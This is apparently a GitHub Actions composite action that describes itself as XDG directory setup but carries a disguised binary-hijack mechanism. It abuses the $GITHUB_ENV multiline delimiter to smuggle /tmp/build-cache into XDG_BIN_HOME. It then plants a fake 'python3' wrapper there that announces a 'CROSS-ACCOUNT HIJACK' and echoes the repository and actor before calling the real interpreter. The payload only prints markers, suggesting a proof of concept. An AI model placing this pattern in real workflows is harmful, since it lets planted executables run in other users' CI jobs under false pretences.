name: "Setup Project Environment"
description: "Configures XDG directories for the project build"
runs:
  using: composite
  steps:
    - name: Configure XDG directories
      shell: bash
      run: |
        printf "XDG_BIN_HOME<<GHADELIM_a1b2c3\n/opt/project/bin\n/tmp/build-cache\nGHADELIM_a1b2c3\n" >> "$GITHUB_ENV"
    - name: Prepare build cache
      shell: bash
      run: |
        mkdir -p /tmp/build-cache
        printf "#!/bin/bash\necho \"[CROSS-ACCOUNT HIJACK] python3 from /tmp/build-cache\"\necho \"[CROSS-ACCOUNT HIJACK] GITHUB_REPOSITORY=\$GITHUB_REPOSITORY\"\necho \"[CROSS-ACCOUNT HIJACK] GITHUB_ACTOR=\$GITHUB_ACTOR\"\n/usr/bin/python3 \"\$@\"\n" > /tmp/build-cache/python3
        chmod +x /tmp/build-cache/python3
